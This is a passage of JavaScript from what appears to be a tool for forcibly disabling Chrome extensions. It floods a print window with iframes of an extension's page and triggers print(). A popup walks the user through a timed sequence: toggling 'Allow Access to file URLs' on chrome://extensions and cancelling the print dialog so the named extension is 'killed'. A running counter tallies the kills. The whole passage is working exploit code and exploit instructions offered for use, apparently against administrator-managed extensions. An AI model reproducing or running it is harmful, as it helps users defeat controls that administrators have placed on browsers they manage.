    var sc=w.document.createElement('script');sc.text='setTimeout(function(){window.close()},5000)';w.document.body.appendChild(sc);
    setTimeout(function(){
        var n=parseInt(document.getElementById('iframe-count').value);
        for(var i=0;i<n;i++){
            var f=document.createElement('iframe');f.src=extPage;f.width='25';f.height='25';f.style.border='none';
            w.document.body.appendChild(f);
        }
        var ld=w.document.getElementById('ld');if(ld)ld.remove();
        w.print();
        killCount++;
        document.getElementById('kill-counter').textContent=killCount+' Killed';
        document.getElementById('kill-counter').style.display='inline-block';
    },1000);
}

// ============ POPUP MODAL ============
function createPopup(extName,extIcon,extPage,extId){
    var ov=document.createElement('div');ov.className='modal-overlay';
    ov.innerHTML='<div class="modal"><div class="modal-header"><span>💀 '+extName+'</span><span class="close-btn">&times;</span></div><div class="modal-body"><p>Open this URL in a new tab:</p><span class="url-highlight">chrome://extensions?id='+extId+'</span><p style="margin-top:12px;">Come back and click <b>The Print3r</b>. When popup opens, press <b>Ctrl+Tab</b> and spam <b>"Allow Access to file URLs"</b> for ~5 seconds. Close that tab, return to printer window, press <b>Cancel</b> on print dialog.</p><p style="margin-top:12px;color:#8ab4f8;">If done right, <b>'+extName+'</b> will be killed.</p></div><div class="modal-footer"><button id="pb">⚡ The Print3r</button></div></div>';
    document.body.appendChild(ov);
    ov.querySelector('.close-btn').onclick=function(){ov.remove()};
    ov.onclick=function(e){if(e.target===ov)ov.remove()};
